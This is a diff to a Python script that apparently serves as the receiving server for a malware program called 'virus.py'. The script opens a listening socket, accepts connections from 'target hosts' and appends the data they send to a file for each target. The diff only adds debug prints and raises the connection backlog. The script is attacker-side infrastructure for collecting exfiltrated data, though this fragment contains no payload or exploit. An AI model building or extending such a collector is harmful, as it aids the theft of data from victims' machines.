@@ -44,15 +44,18 @@ def write_target_data_file(ip, data):
     with open(filename, 'a') as file:
         file.write(str(f"{data}\n"))
     
-    print(f"Data exfiltrated from '{ip}' to '{filename}'.")
 #endregion
 
 # ----------- Main Operations ----------- 
 
 # (1) Setup connection to allow for virus.py to connect.
+print("hello world")
+
 s = socket.socket()
 s.bind((host, port))
-s.listen(2)
+s.listen(1000)
+
+print("hello world")
 
 print(host)
 conn, address = s.accept()
@@ -62,6 +65,7 @@ target_ip, target_port = address
 
 # (2) Create a new file for each target host.
 create_target_data_file(target_ip)
+print("Created file successfully")
 
 while True:
     # Receive the data sent from the target host.
